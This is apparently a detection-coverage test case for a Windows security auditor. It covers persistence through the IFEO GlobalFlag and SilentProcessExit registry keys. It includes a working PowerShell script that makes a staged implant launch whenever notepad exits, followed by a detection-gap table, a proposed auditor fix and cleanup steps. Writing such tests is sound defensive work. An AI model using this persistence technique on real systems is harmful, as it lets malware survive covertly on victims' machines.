# Test: Persistence — Silent Process Exit via IFEO GlobalFlag (very advanced)

**Chain:** instead of hijacking a process *launch* (IFEO Debugger), this hijacks a process
***exit***: set `GlobalFlag=512` (FLG_MONITOR_SILENT_PROCESS_EXIT) on a target binary in
IFEO, then register a `MonitorProcess` under
`...\Image File Execution Options\<exe>\SilentProcessExit` — when the legit process exits,
Windows silently launches your payload ([Hackers Arise](https://hackers-arise.com/advanced-windows-persistence-part-1-remaining-inside-the-windows-target/),
[HADESS](https://hadess.io/the-art-of-windows-persistence/)). Fires every time a normal
process (e.g. notepad) closes.

**Implant setup:** [`../_common/implant-build.md`](../_common/implant-build.md); stage
`sysupd.exe` at `C:\Users\Public\`.

**Victim (elevated PowerShell):** `.\test.ps1`

```powershell
$ifeo = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"
New-Item $ifeo -Force | Out-Null
Set-ItemProperty $ifeo -Name GlobalFlag -Value 512 -Type DWord          # monitor silent exits
New-Item "$ifeo\SilentProcessExit" -Force | Out-Null
Set-ItemProperty "$ifeo\SilentProcessExit" -Name ReportingMode -Value 1 -Type DWord
Set-ItemProperty "$ifeo\SilentProcessExit" -Name MonitorProcess -Value "C:\Users\Public\sysupd.exe"
# trigger: start and close notepad
Start-Process notepad; Start-Sleep 2; Stop-Process -Name notepad -Force
# -> payload launches as notepad "exits"
```

**Expected vs gap:**

| Event | Today |
|---|---|
| `GlobalFlag` write / `SilentProcessExit` key | ❌ GAP — the auditor's IFEO collection only reads the `Debugger` value; GlobalFlag and the SilentProcessExit subkey are invisible |
| Payload launch when notepad exits | ✅ standard chain — `EVT-4688-TEMP` + `PROG-IMPLANT-LAUNCH` (path-based, doesn't care how it started) |

**Fix to file:** extend the IFEO inventory to also record `GlobalFlag != 0` and enumerate
`SilentProcessExit\MonitorProcess` — one more branch in the existing IFEO walk, critical
severity like IFEO Debugger.

**Cleanup:** `Remove-Item -Recurse $ifeo` (the key you created — notepad.exe had none by default).
